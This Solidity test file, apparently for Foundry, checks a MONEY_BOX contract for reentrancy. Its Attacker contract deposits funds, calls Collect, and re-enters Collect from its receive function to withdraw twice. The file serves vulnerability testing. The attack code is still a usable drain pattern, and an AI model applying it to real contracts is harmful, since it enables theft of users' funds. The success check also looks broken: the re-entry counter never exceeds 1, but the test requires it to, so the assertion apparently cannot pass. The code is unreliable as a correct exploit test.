
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyMONEY_BOX is Test {
    using stdStorage for StdStorage;
    
    MONEY_BOX public _contractUnderTest;
    Log public _logContract;
    
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new MONEY_BOX();
        
        _contractUnderTest.SetMinSum(0);
        _contractUnderTest.SetLogFile(address(_logContract));
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0);
        vm.assume(attackVal < type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        vm.warp(block.timestamp + 1);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MONEY_BOX public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = MONEY_BOX(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        _victim.Put{value: val}(0);
        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        
        _victim.Collect(val);

        if (attackCallCount > 1 && address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {
            attackCallCount++;
            _victim.Collect(storedAttackVal);
        }
    }
}
